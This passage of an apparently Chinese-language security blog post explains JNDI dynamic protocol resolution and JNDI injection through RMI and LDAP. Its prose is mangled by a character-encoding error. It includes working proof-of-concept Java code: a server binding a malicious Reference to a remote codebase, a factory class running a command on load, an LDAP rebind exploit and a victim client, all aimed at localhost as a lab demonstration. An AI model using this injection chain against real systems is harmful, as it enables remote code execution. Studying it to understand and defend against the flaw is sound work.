<p>rmiURLContextæœ¬èº«æ²¡æœ‰lookupæ–¹æ³•ï¼Œè°ƒç”¨åˆ°äº†çˆ¶ç±»çš„lookupæ–¹æ³•</p>
<p>æ‰§è¡Œ getRootURLContext()æ–¹æ³•è·å–è§£æç»“æœï¼Œç»“æœä¸ºå›¾äºŒï¼Œé€šè¿‡ getResolvedObj æ–¹æ³•å–å‡º RegistryContextï¼Œç„¶åç»§ç»­è°ƒç”¨lookupæ–¹æ³•</p>
<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492629068.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492629053.png" alt="" loading="lazy"></figure>
<p>RegistryContext#lookup</p>
<p>è¿›å…¥ifè¯­å¥ ï¼Œè¿”å›   ä¸€ä¸ªRegistryContextæ–°çš„å®ä¾‹ï¼Œåœ¨å®ä¾‹åŒ–çš„æ—¶å€™ï¼ŒæŠŠä¿¡æ¯ä¹Ÿä¼ å¥½äº†</p>
<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492629084.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492629101.png" alt="" loading="lazy"></figure>
<p>æµç¨‹ï¼š</p>
<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492629116.png" alt="" loading="lazy"></figure>
<h1 id="jndiåŠ¨æ€åè®®è½¬æ¢">JNDIåŠ¨æ€åè®®è½¬æ¢</h1>
<p>å®é™…ä¸Šï¼Œåœ¨ Context#lookup()æ–¹æ³•çš„å‚æ•°ä¸­ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šè‡ªå·±çš„æŸ¥æ‰¾åè®®ã€‚JNDIä¼šé€šè¿‡ç”¨æˆ·çš„è¾“å…¥æ¥åŠ¨æ€çš„è¯†åˆ«ç”¨æˆ·è¦è°ƒç”¨çš„æœåŠ¡ä»¥åŠè·¯å¾„ã€‚æ¥çœ‹ä¸‹é¢çš„ä¾‹å­</p>
<p>å®¢æˆ·ç«¯ï¼š</p>
<pre><code class="language-java">package org.example;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDI {
    public static void main(String[] args) throws NamingException, RemoteException {
      
        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
        //åˆå§‹åŒ–ä¸Šä¸‹æ–‡
        Context context = new InitialContext();

        //è°ƒç”¨è¿œç¨‹ç±»
        Remoteobj remoteobj = (Remoteobj) context.lookup(string);
        remoteobj.sayHello(&quot;Hello World&quot;);

    }
}
</code></pre>
<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492629132.png" alt="" loading="lazy"></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰è®¾ç½®ç›¸åº”çš„ç¯å¢ƒå˜é‡æ¥åˆå§‹åŒ–Contextï¼Œä½†æ˜¯JNDIä»æ—§é€šè¿‡lookup()çš„å‚æ•°è¯†åˆ«å‡ºäº†æˆ‘ä»¬è¦è°ƒç”¨çš„æœåŠ¡ä»¥åŠè·¯å¾„ï¼Œè¿™å°±æ˜¯JNDIçš„åŠ¨æ€åè®®è½¬æ¢ã€‚</p>
<h1 id="jndiåŠ¨æ€åè®®è½¬æ¢åº•å±‚åˆ†æ">JNDIåŠ¨æ€åè®®è½¬æ¢åº•å±‚åˆ†æ</h1>
<p>æ–­ç‚¹æ‰“åœ¨</p>
<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492629147.png" alt="" loading="lazy"></figure>
<p>å‘ç°ä¸ç®¡æ˜¯è°ƒç”¨lookupã€bindæˆ–è€…æ˜¯å…¶ä»–<code>initalContext</code>ä¸­çš„æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨<code>getURLOrDefaultInitCtx()</code>æ–¹æ³•è¿›è¡Œæ£€æŸ¥ã€‚</p>
<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492629163.png" alt="" loading="lazy"></figure>
<p>å…ˆè·Ÿè¿›getURLOrDefaultInitCtx()æ–¹æ³•</p>
<p>ä¼šè°ƒç”¨getURLSchemeæ–¹æ³•æ¥è·å–é€šä¿¡çš„åè®®ï¼Œè¿™é‡Œè·å–åˆ°çš„å°±æ˜¯rmiåè®®ï¼Œç„¶åæŠŠè·å–åˆ°çš„åè®®ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨getURLContextæ–¹æ³•</p>
<pre><code class="language-java">protected Context getURLOrDefaultInitCtx(String name)
    throws NamingException {
    if (NamingManager.hasInitialContextFactoryBuilder()) {
        return getDefaultInitCtx();
    }
    String scheme = getURLScheme(name);
    if (scheme != null) {
        Context ctx = NamingManager.getURLContext(scheme, myProps);
        if (ctx != null) {
            return ctx;
        }
    }
    return getDefaultInitCtx();
}
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492629179.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›åˆ°NamingManager.getURLContextæ–¹æ³•</p>
<p>è°ƒç”¨getURLObjectï¼Œç»§ç»­è·Ÿè¿›</p>
<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492629195.png" alt="" loading="lazy"></figure>
<p>getURLObject()æ–¹æ³•</p>
<p>æ ¹æ®defaultPkgPrefixçš„å±æ€§æ¥åŠ¨æ€ç”Ÿæˆ<code>Factory</code>ç±»</p>
<pre><code class="language-java">private static Object getURLObject(String scheme, Object urlInfo,
                                   Name name, Context nameCtx,
                                   Hashtable&lt;?,?&gt; environment)
        throws NamingException {

    // e.g. &quot;ftpURLContextFactory&quot;
    ObjectFactory factory = (ObjectFactory)ResourceManager.getFactory(
        Context.URL_PKG_PREFIXES, environment, nameCtx,
        &quot;.&quot; + scheme + &quot;.&quot; + scheme + &quot;URLContextFactory&quot;, defaultPkgPrefix);

    if (factory == null)
      return null;

    // Found object factory
    try {
        return factory.getObjectInstance(urlInfo, name, nameCtx, environment);
    } catch (NamingException e) {
        throw e;
    } catch (Exception e) {
        NamingException ne = new NamingException();
        ne.setRootCause(e);
        throw ne;
    }

}
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492629211.png" alt="" loading="lazy"></figure>
<p>åªè¦æ˜¯è¿™ä¸ªåŒ…ä¸‹çš„éƒ½æ˜¯å¯ä»¥è¿›è¡Œè½¬æ¢çš„åè®®</p>
<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492629226.png" alt="" loading="lazy"></figure>
<p>é€šè¿‡åŠ¨æ€åè®®è½¬æ¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»…é€šè¿‡ä¸€ä¸²ç‰¹å®šå­—ç¬¦ä¸²å°±å¯ä»¥æŒ‡å®šJNDIè°ƒç”¨ä½•ç§æœåŠ¡ï¼Œååˆ†æ–¹ä¾¿ã€‚ä½†æ˜¯æ–¹ä¾¿æ˜¯ä¼šä»˜å‡ºä¸€å®šä»£ä»·çš„ã€‚å¯¹äºä¸€ä¸ªç³»ç»Ÿæ¥è®²ï¼Œå¾€å¾€è¶Šæ–¹ä¾¿ï¼Œå°±è¶Šä¸å®‰å…¨ã€‚</p>
<p>å‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<code>string</code>å­—æ®µï¼Œé‚£ä¹ˆå°±å¯ä»¥æ­å»ºæ¶æ„æœåŠ¡ï¼Œå¹¶æ§åˆ¶JNDIæ¥å£è®¿é—®è¯¥æ¶æ„ï¼Œäºæ˜¯å°†å¯¼è‡´æ¶æ„çš„è¿œç¨‹classæ–‡ä»¶åŠ è½½ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¿™ç§æ”»å‡»æ‰‹æ³•å…¶å®å°±æ˜¯JNDIæ³¨å…¥ï¼Œå®ƒå’ŒRMIæœåŠ¡æ”»å‡»æ‰‹æ³•ä¸­çš„â€è¿œç¨‹åŠ è½½CodeBaseâ€è¾ƒä¸ºç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ä¸€äº›è¿œç¨‹é€šä¿¡æ¥å¼•å…¥æ¶æ„çš„classæ–‡ä»¶ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p>
<h1 id="jndi-refernce-ç±»">JNDI-Refernce ç±»</h1>
<p>Referenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å/ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ï¼Œæ¯”å¦‚è¿œç¨‹è·å– RMI æœåŠ¡ä¸Šçš„å¯¹è±¡æ˜¯ Reference ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½classæ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–</p>
<p>æœ‰ç‚¹åƒæ˜¯RMIä¸­Codebaseçš„åŠŸèƒ½ï¼Œåœ¨JNDIä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Refernceè¿›è¡Œè°ƒç”¨è¿œç¨‹æœåŠ¡å™¨çš„ç±»</p>
<p>Referenceç±»æ„é€ å‡½æ•°</p>
<p>å®ƒçš„æ„é€ å‡½æ•°å¾ˆå¤šï¼Œè¿™é‡Œå°±åˆ—ä¸¾ä¸€ç§</p>
<pre><code class="language-java">Reference(String className,  String factory, String factoryLocation) 
</code></pre>
<p>classNameä¸ºè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»åï¼Œå¦‚æœæœ¬åœ°æ‰¾ä¸åˆ°è¿™ä¸ªç±»åï¼Œå°±å»è¿œç¨‹åŠ è½½</p>
<p>factoryä¸ºå·¥å‚ç±»å</p>
<p>factoryLocationä¸ºå·¥å‚ç±»åŠ è½½çš„åœ°å€ï¼Œå¯ä»¥æ˜¯file://ã€ftp://ã€http:// ç­‰åè®®</p>
<p>åœ¨RMIä¸­ï¼Œç”±äºæˆ‘ä»¬è¿œç¨‹åŠ è½½çš„å¯¹è±¡éœ€è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ReferenceWrapperç±»å¯¹Referenceç±»æˆ–å…¶å­ç±»å¯¹è±¡è¿›è¡Œè¿œç¨‹åŒ…è£…æˆRemoteç±»ä½¿å…¶èƒ½å¤Ÿè¢«è¿œç¨‹è®¿é—®ã€‚</p>
<h1 id="jndiæ³¨å…¥">JNDIæ³¨å…¥</h1>
<p>å¤§æ¦‚çš„æ€è·¯å°±æ˜¯ï¼š</p>
<p>å—å®³è€…å…ˆå‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªReferenceç±»ï¼ŒæœåŠ¡å™¨è¿”å›ä¸€ä¸ªReferenceç±»ï¼Œå…¶ä¸­æŒ‡æ˜äº†éœ€è¦åˆ›å»ºçš„ç±»ï¼Œåˆ›å»ºè¯¥ç±»çš„å·¥å‚ç±»ï¼Œä»¥åŠå·¥å‚ç±»çš„åœ°å€</p>
<p>ç„¶åå—å®³è€…å°è¯•åœ¨æœ¬åœ°åŠ è½½æŒ‡å®šçš„å·¥å‚ç±»ï¼Œå‘ç°æ²¡æœ‰ï¼Œå°±ä¼šå¯¹æŒ‡å®šè¿œç¨‹åœ°å€å»è¿›è¡Œä¸‹è½½ï¼Œç„¶åè¿œå¤„è¿”å›ä¸€ä¸ªæ¶æ„å­—èŠ‚ç ï¼Œå—å®³è€…æ¥å—å­—èŠ‚ç </p>
<p>å°†è¿”å›çš„å­—èŠ‚ç å®ä¾‹åŒ–ï¼Œå¯¼è‡´RCE</p>
<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492629242.png" alt="" loading="lazy"></figure>
<h2 id="jndirmi-2">JNDI+RMI</h2>
<p>æœåŠ¡ç«¯ï¼š</p>
<pre><code class="language-java">package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class JNDI_server {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
    }
}
</code></pre>
<p>å·¥å‚ç±»ï¼ˆæ¶æ„ç±»ï¼‰</p>
<pre><code class="language-java">import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;

public class RMIHello extends UnicastRemoteObject implements ObjectFactory {

    public RMIHello() throws IOException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
        return null;
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯ï¼š</p>
<pre><code class="language-java">package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;


public class JNDI {
    public static void main(String[] args) throws Exception {
     
        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
        //åˆå§‹åŒ–ä¸Šä¸‹æ–‡
        Context context = new InitialContext();

        //è°ƒç”¨è¿œç¨‹ç±»
        context.lookup(string);
      

    }
}
</code></pre>
<p>åˆ©ç”¨pythonèµ·ä¸ªç®€å•çš„httpæœåŠ¡ï¼Œç„¶åå¯åŠ¨æœåŠ¡ç«¯ï¼Œåœ¨å¯åŠ¨å®¢æˆ·ç«¯ã€‚</p>
<p>æ³¨æ„ç‚¹ï¼š</p>
<p>æˆ‘ä»¬çš„å·¥å‚ç±»æœ€å¥½æ˜¯ç›´æ¥æ”¾åœ¨ä¸»ç›®å½•ä¸‹ï¼Œä¸è¦æ”¾åœ¨æ¨¡å—ä¸‹é¢ï¼Œä¸ç„¶ä¼šæç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶</p>
<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492629273.png" alt="" loading="lazy"></figure>
<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492629259.png" alt="" loading="lazy"></figure>
<h3 id="æµç¨‹åˆ†æ">æµç¨‹åˆ†æ</h3>
<p>JNDI çš„åŠ¨æ€åè®®è½¬åŒ–å¯¼è‡´æˆ‘ä»¬èƒ½å¤Ÿä» Reference ç±»ä¸­è¯»å–åœ°å€ï¼Œä»æ¶æ„åœ°å€ä¸­è·å–æ¶æ„å·¥å‚ç±»å­—èŠ‚ç å†…å®¹ï¼Œç„¶ååœ¨æœ¬åœ°è¿›è¡Œå®ä¾‹åŒ–å¯¼è‡´RCE</p>
<p>ä¸‹é¢çœ‹å…·ä½“ä»£ç </p>
<p>æ–­ç‚¹æ‰“åœ¨å®¢æˆ·ç«¯</p>
<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492629290.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›getURLOrDefaultInitCtx</p>
<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492629307.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œå› ä¸º URL ä¼ å€¼ä¸­åˆ¶å®šäº† RMI åè®®ï¼Œæ‰€ä»¥è¿™é‡Œçš„ scheme å–å‡ºæ¥æ˜¯â€RMIâ€ï¼Œè¿›å…¥ if åˆ¤æ–­å®Œæ¯•ä¹‹åçš„å†…å®¹ï¼Œé€šè¿‡ NamingManager çš„ getURLContext çš„æ–¹æ³•æ¥è·å– contextï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492629321.png" alt="" loading="lazy"></figure>
<p>åªæœ‰ä¸€ä¸ªgetURLObjectæ–¹æ³•ï¼Œè·Ÿè¿›</p>
<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492629367.png" alt="" loading="lazy"></figure>
<p>æ ¹æ® scheme çš„å€¼æ„é€ å‡ºäº† rmiURLContext çš„æ„é€ å®ä½“ factoryï¼Œç„¶åè°ƒç”¨factory.getObjectInstanceï¼Œç»§ç»­è·Ÿè¿›</p>
<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1749492629382.png" alt="" loading="lazy"></figure>
<p>å·¥å‚ç±»æ¥è·å– rmiURLContext çš„å†…å®¹ï¼Œè¿”å›ä¸€ä¸ªrmiURLContextå®ä¾‹</p>
<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492629397.png" alt="" loading="lazy"></figure>
<p>ç„¶ågetURLOrDefaultInitCtxè¿™ä¸€éƒ¨åˆ†çœ‹å®Œäº†ï¼Œç°åœ¨çœ‹lookupè¿™ä¸€éƒ¨åˆ†</p>
<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492629413.png" alt="" loading="lazy"></figure>
<p>rmiURLContext æœ¬èº«æ²¡æœ‰ lookup æ–¹æ³•çš„å®šä¹‰ï¼Œè·Ÿè¿›åˆ° GenericURLContext çš„ lookup æ–¹æ³•</p>
<p>getRootURLContext æ–¹æ³•å’ŒgetResolvedObjéƒ½æ˜¯ä¸ºäº†å»è·å¾—RegistryContextï¼Œç„¶åè°ƒç”¨RegistryContext.lookupæ–¹æ³•</p>
<p>ç»§ç»­è·Ÿè¿›</p>
<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492629429.png" alt="" loading="lazy"></figure>
<p>ç„¶åè¿™ä¸€éƒ¨åˆ†å°±æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œèµ°åˆ°äº†RegistryImpl_Stub éƒ¨åˆ†äº†</p>
<p>ä»è¿œç¨‹å®¢æˆ·ç«¯ä¸Šè¯·æ±‚å­—èŠ‚ç äº†ï¼Œæœ€åè°ƒç”¨ decodeObeject è¿›è¡Œå®ä¾‹åŒ–ï¼Œè·Ÿè¿›decodeObejectæ–¹æ³•</p>
<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492629444.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›getObjectInstance</p>
<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492629460.png" alt="" loading="lazy"></figure>
<p>è·Ÿè¿›getObjectFactoryFromReferenceæ–¹æ³•</p>
<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492629476.png" alt="" loading="lazy"></figure>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†loadClassæ–¹æ³• åŠ è½½å­—èŠ‚ç </p>
<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492629492.png" alt="" loading="lazy"></figure>
<h2 id="jndildap">JNDI+LDAP</h2>
<h3 id="ldapç®€ä»‹">LDAPç®€ä»‹</h3>
<p>LDAPï¼ˆLightweight Directory Access Protocol ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§ç›®å½•æœåŠ¡åè®®ï¼Œè¿è¡Œåœ¨TCP/IPå †æ ˆä¹‹ä¸Šã€‚LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿï¼Œç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œèƒ½è¿›è¡ŒæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢ï¼Œä»¥æ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ã€‚LDAPç›®å½•æœåŠ¡åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ï¼Œå®ƒçš„åŠŸèƒ½ç”¨äºå¯¹ä¸€ä¸ªå­˜åœ¨ç›®å½•æ•°æ®åº“çš„è®¿é—®ã€‚ LDAPç›®å½•å’ŒRMIæ³¨å†Œè¡¨çš„åŒºåˆ«åœ¨äºæ˜¯å‰è€…æ˜¯ç›®å½•æœåŠ¡ï¼Œå¹¶å…è®¸åˆ†é…å­˜å‚¨å¯¹è±¡çš„å±æ€§ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒLDAP <strong>ã€Œæ˜¯ä¸€ä¸ªåè®®ã€</strong>ï¼Œçº¦å®šäº† Client ä¸ Server ä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ã€ä½¿ç”¨çš„ç«¯å£å·ã€è®¤è¯æ–¹å¼ç­‰å†…å®¹ã€‚è€Œ <strong>ã€ŒLDAP åè®®çš„å®ç°ã€</strong>ï¼Œæœ‰ç€ä¼—å¤šç‰ˆæœ¬ï¼Œä¾‹å¦‚å¾®è½¯çš„ Active Directory æ˜¯ LDAP åœ¨ Windows ä¸Šçš„å®ç°ã€‚AD å®ç°äº† LDAP æ‰€éœ€çš„æ ‘å½¢æ•°æ®åº“ã€å…·ä½“å¦‚ä½•è§£æè¯·æ±‚æ•°æ®å¹¶åˆ°æ•°æ®åº“æŸ¥è¯¢ç„¶åè¿”å›ç»“æœç­‰åŠŸèƒ½ã€‚å†ä¾‹å¦‚ OpenLDAP æ˜¯å¯ä»¥è¿è¡Œåœ¨ Linux ä¸Šçš„ LDAP åè®®çš„å¼€æºå®ç°ã€‚è€Œæˆ‘ä»¬å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† Active Directoryã€OpenLDAP è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨ã€‚</p>
<p>åœ¨LDAPä¸­ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ç›®å½•æ ‘æ¥è®¿é—®ä¸€æ¡è®°å½•çš„ï¼Œç›®å½•æ ‘çš„ç»“æ„å¦‚ä¸‹</p>
<pre><code class="language-java">dn ï¼šä¸€æ¡è®°å½•çš„è¯¦ç»†ä½ç½®
dc ï¼šä¸€æ¡è®°å½•æ‰€å±åŒºåŸŸ    (å“ªä¸€é¢—æ ‘)
ou ï¼šä¸€æ¡è®°å½•æ‰€å±ç»„ç»‡    ï¼ˆå“ªä¸€ä¸ªåˆ†æ”¯ï¼‰
cn/uidï¼šä¸€æ¡è®°å½•çš„åå­—/ID   (å“ªä¸€ä¸ªè‹¹æœåå­—)
...
LDAPç›®å½•æ ‘çš„æœ€é¡¶éƒ¨å°±æ˜¯æ ¹ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œåŸºå‡†DN&quot;ã€‚
</code></pre>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨LDAPæœåŠ¡æ¥å­˜å‚¨Javaå¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶èƒ½å¤Ÿæ§åˆ¶JNDIå»è®¿é—®å­˜å‚¨åœ¨LDAPä¸­çš„Javaæ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚LDAPèƒ½å¤Ÿå­˜å‚¨çš„Javaå¯¹è±¡å¦‚ä¸‹</p>
<ul>
<li>Java åºåˆ—åŒ–</li>
<li>JNDIçš„References</li>
<li>Marshalledå¯¹è±¡</li>
<li>Remote Location</li>
</ul>
<h3 id="å¤ç°ä»£ç ">å¤ç°ä»£ç </h3>
<h4 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h4>
<p>å…ˆéœ€è¦å¯¼å…¥<a href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundidä¾èµ–åº“</a></p>
<p>ç„¶ååœ¨é¡¹ç›®ç»“æ„ä¸­å¯¼å…¥</p>
<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492629336.png" alt="" loading="lazy"></figure>
<h4 id="ä»£ç ">ä»£ç </h4>
<p>å…ˆå†™ä¸ªLDAPæœåŠ¡ç«¯ï¼šï¼ˆç›´æ¥AIå°±è¡Œï¼‰</p>
<pre><code class="language-java">package org.example;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.net.InetAddress;

public class LDAP_server {
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
    public static void main(String[] args) throws IOException {
        int port = 10389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &quot;listen&quot;, //$NON-NLS-1$
                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.setSchema(null);
            config.setEnforceAttributeSyntaxCompliance(false);
            config.setEnforceSingleStructuralObjectClass(false);
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);
            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);
            ds.add(&quot;dn: &quot; + &quot;uid=longofo,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);

            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>EXPï¼ˆæŠŠæ¶æ„ç±»æ”¾åˆ°æœåŠ¡ç«¯å»ï¼‰</p>
<pre><code class="language-java">package org.example;
import javax.naming.InitialContext;
import javax.naming.Reference;

public class LDAP_EXP {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext =new InitialContext();
        Reference reference =new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://localhost:8000/&quot;);
        initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,reference);
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯ï¼š</p>
<pre><code class="language-java">package org.example;

import javax.naming.InitialContext;

public class LDAP_C {
    public static void main(String[] args) throws Exception {
        String string = &quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;;

        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
</code></pre>
<p>ç»“æœ</p>
<p>å…ˆå¼€å¯pythonæœåŠ¡ï¼Œç„¶åæ‰“å¼€LDAPæœåŠ¡ç«¯ï¼Œç„¶ååœ¨è¿è¡ŒEXPæŠŠæ¶æ„ç±»æ”¾ä¸Šå»ï¼Œç„¶ååœ¨è¿è¡Œå®¢æˆ·ç«¯ï¼ŒæˆåŠŸå®ç°ç±»åŠ è½½</p>
<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492629351.png" alt="" loading="lazy"></figure>
<h3 id="æµç¨‹åˆ†æ-2">æµç¨‹åˆ†æ</h3>
<p>æ•´ä½“å’Œ RMI å¾ˆç›¸ä¼¼ï¼Œæˆ‘ä»¬æ–­ç‚¹ä¾æ—§æ‰“åœ¨</p>
<p>æ­¥å…¥</p>
<figure data-type="image" tabindex="42"><img src="https://bloyet.github.io/post-images/1749492629507.png" alt="" loading="lazy"></figure>
<p>è¿™é‡Œæˆ‘ä»¬å°±ä¸çœ‹getURLOrDefaultInitCtx(name)è¿™ä¸€éƒ¨åˆ†äº†ï¼Œç›´æ¥è·Ÿè¿›lookupæ–¹æ³•</p>
<figure data-type="image" tabindex="43"><img src="https://bloyet.github.io/post-images/1749492629523.png" alt="" loading="lazy"></figure>
<p>è°ƒç”¨çˆ¶ç±»çš„lookupæ–¹æ³•</p>
<figure data-type="image" tabindex="44"><img src="https://bloyet.github.io/post-images/1749492629539.png" alt="" loading="lazy"></figure>
<p>å‰é¢æ˜¯ä¸€æ ·è·å¾—LdapCtx ç„¶ååœ¨è°ƒç”¨lookupæ–¹æ³•</p>
<figure data-type="image" tabindex="45"><img src="https://bloyet.github.io/post-images/1749492629554.png" alt="" loading="lazy"></figure>
<p>ldapCtx æœ¬èº«æ˜¯æ²¡æœ‰ lookup æ–¹æ³•ï¼Œè¿˜æ˜¯å¾—è°ƒå®ƒçš„çˆ¶ç±»</p>
<p>è¿™é‡Œå…ˆè·Ÿè¿›p_lookupæ–¹æ³•</p>
<figure data-type="image" tabindex="46"><img src="https://bloyet.github.io/post-images/1749492629570.png" alt="" loading="lazy"></figure>
